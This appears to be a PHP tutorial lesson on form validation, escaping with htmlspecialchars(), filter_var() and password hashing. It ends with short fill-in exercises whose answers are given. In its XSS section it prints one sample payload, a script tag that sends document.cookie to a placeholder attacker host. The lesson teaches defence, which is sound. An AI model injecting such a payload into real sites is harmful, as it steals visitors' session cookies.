---
title: PHP Form Validation and Security
module: 5
minutes: 18
---

The golden rule of web development: **never trust user input**. Anything that comes from a visitor, whether a form field, a URL parameter, a cookie or an uploaded file, may be empty, wrong, or deliberately malicious. This lesson shows how to **validate** input (is it what we expect?) and how to **escape** output (print it safely).

## Validation vs escaping

- **Validation** checks data when it arrives: Is the email address real-looking? Is the age a number between 5 and 120? If not, show an error and do not save it.
- **Escaping** makes data safe at the moment you output it: in HTML, in SQL, in a URL. You escape even data that passed validation.

You need both. Validation keeps your data clean; escaping keeps your pages safe.

## Cross-site scripting (XSS) and htmlspecialchars()

Imagine a comment box that prints whatever the visitor typed. An attacker submits this "comment":

```text
<script>document.location='https://evil.example/?c='+document.cookie</script>
```

If you `echo` it directly, every visitor's browser runs that script and sends their login cookie to the attacker. This attack is called **cross-site scripting (XSS)**, and it is one of the most common security holes on the web.

The fix is `htmlspecialchars()`. It turns the characters that have special meaning in HTML into harmless **entities**, so the browser shows them as text instead of running them.

```example php
<?php
$comment = "<script>alert('hacked')</script> & \"quotes\"";

echo "Unsafe: " . $comment . "\n";
echo "Safe:   " . htmlspecialchars($comment) . "\n";
```

```output
Unsafe: <script>alert('hacked')</script> & "quotes"
Safe:   &lt;script&gt;alert(&#039;hacked&#039;)&lt;/script&gt; &amp; &quot;quotes&quot;
```

| Character | Becomes |
|---|---|
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#039;` |

Since PHP 8.1, single and double quotes are converted by default, which also protects values you place inside HTML attributes like `value="..."`.

> **Warning:** Escape **every** piece of user data when you print it into HTML, including values you loaded back from your own database. A short helper such as `function e($s) { return htmlspecialchars($s); }` makes this easy to do consistently.

## Validating with filter_var()

`filter_var()` checks (and sometimes converts) a value using a built-in filter. It returns the cleaned value, or `false` if the value is invalid.

```example php
<?php
var_dump(filter_var("amina@example.co.ke", FILTER_VALIDATE_EMAIL));
var_dump(filter_var("amina@", FILTER_VALIDATE_EMAIL));
var_dump(filter_var("42", FILTER_VALIDATE_INT));
var_dump(filter_var("4.2", FILTER_VALIDATE_INT));
var_dump(filter_var("https://skope.co.ke", FILTER_VALIDATE_URL));
var_dump(filter_var("yes", FILTER_VALIDATE_BOOLEAN));
```

```output
string(19) "amina@example.co.ke"
bool(false)
int(42)
bool(false)
string(19) "https://skope.co.ke"
bool(true)
```

Notice that `FILTER_VALIDATE_INT` returns a real `int`, not a string. You can also set a range with options:

```example php
<?php
$age = filter_var("130", FILTER_VALIDATE_INT, [
    "options" => ["min_range" => 5, "max_range" => 120],
]);
var_dump($age);
```

```output
bool(false)
```

> **Tip:** `filter_input(INPUT_POST, "email", FILTER_VALIDATE_EMAIL)` reads straight from the POST data and validates in one step. It returns `null` if the field was not sent at all.

## A complete validated form

Here is the pattern used by most real PHP forms:

1. Read each field with a default (`?? ""`) and `trim()` the spaces.
2. Check each rule and collect error messages in an `$errors` array.
3. If `$errors` is empty, process the data (save it, send an email) and redirect.
4. Otherwise, show the form again with the errors **and** the values the visitor already typed ("sticky" fields), escaped.

The output below shows the HTML produced when the visitor submits the name `Otieno`, the email `otieno@mail` and the phone `0712`.

```example php
<?php
$name = $email = $phone = "";
$errors = [];

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $name = trim($_POST["name"] ?? "");
    $email = trim($_POST["email"] ?? "");
    $phone = trim($_POST["phone"] ?? "");

    if ($name === "") {
        $errors["name"] = "Name is required.";
    } elseif (mb_strlen($name) > 50) {
        $errors["name"] = "Name must be 50 characters or fewer.";
    }

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors["email"] = "Enter a valid email address.";
    }

    if (!preg_match('/^(\+254|0)7\d{8}$/', $phone)) {
        $errors["phone"] = "Enter a Kenyan mobile number, e.g. 0712345678.";
    }

    if (!$errors) {
        // save to the database here, then redirect
        echo "<p>Registration received!</p>";
    }
}
?>
<?php foreach ($errors as $error): ?>
<p class="error"><?= htmlspecialchars($error) ?></p>
<?php endforeach; ?>
<form method="post">
  <input name="name" value="<?= htmlspecialchars($name) ?>">
  <input name="email" value="<?= htmlspecialchars($email) ?>">
  <input name="phone" value="<?= htmlspecialchars($phone) ?>">
  <button>Register</button>
</form>
```

```output
<p class="error">Enter a valid email address.</p>
<p class="error">Enter a Kenyan mobile number, e.g. 0712345678.</p>
<form method="post">
  <input name="name" value="Otieno">
  <input name="email" value="otieno@mail">
  <input name="phone" value="0712">
  <button>Register</button>
</form>
```

The name passed, so it has no error, and all three values were put back in the form so Otieno only has to fix the two mistakes. The phone check uses `preg_match()` with a **regular expression**: a pattern meaning "starts with +254 or 0, then 7, then exactly 8 digits".

> **Note:** HTML attributes such as `required` and `type="email"` give quick feedback in the browser, but anyone can bypass them (for example with the browser's developer tools). **Server-side validation in PHP is the one that counts.**

## Other security habits for forms

- **SQL injection:** never build SQL by gluing user input into the query string. Use prepared statements, covered in [MySQL with PDO](mysql-pdo).
- **Passwords:** never store them as plain text. Use `password_hash()` when saving and `password_verify()` when logging in.
- **CSRF (cross-site request forgery):** another website can trick a logged-in user's browser into submitting your form. Protect important forms with a random token stored in the session and checked on submit.
- **Redirect after POST:** after a successful save, send `header("Location: thanks.php"); exit;` so that refreshing the page does not submit the form twice.
- **Whitelists beat blacklists:** check that a value is one of the allowed options (`in_array($course, ["PHP", "Python"], true)`) rather than trying to list every bad value.

```example php
<?php
$hash = password_hash("Kisumu2026!", PASSWORD_DEFAULT);

var_dump(str_starts_with($hash, '$2y$'));
var_dump(password_verify("Kisumu2026!", $hash));
var_dump(password_verify("kisumu2026!", $hash));
```

```output
bool(true)
bool(true)
bool(false)
```

The hash itself is different every time (it contains a random "salt"), which is why we only print checks here. `$2y$` shows it is a bcrypt hash, PHP's current default.

```exercise
Q: Escape the comment before printing it into the page.
echo ___($comment);
A: htmlspecialchars
```

```exercise
Q: Validate that $email looks like an email address.
if (filter_var($email, ___)) { ... }
A: FILTER_VALIDATE_EMAIL
```

```exercise
Q: Check a login password against the stored hash.
if (___($password, $user["hash"])) { ... }
A: password_verify
```
